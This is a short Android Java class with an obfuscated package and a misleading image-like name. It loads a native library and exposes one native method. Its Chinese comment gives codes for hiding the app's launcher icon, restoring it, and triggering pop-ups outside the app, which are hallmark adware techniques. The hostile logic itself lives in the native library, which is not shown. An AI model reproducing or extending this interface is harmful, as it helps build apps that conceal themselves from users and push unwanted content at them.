package com.jia.opens.golden.scales.towards.zsdk5f;

import androidx.annotation.Keep;

@Keep
public class ZJiaPng {
    static {
        try {
            System.loadLibrary("bpresre");
        } catch (Exception e) {
        }
    }
    public static native String jiaPng(String num,boolean c);//参数num:"nf"隐藏图标,"lk"恢复隐藏."gi"外弹(外弹在主进程主线程调用).

}
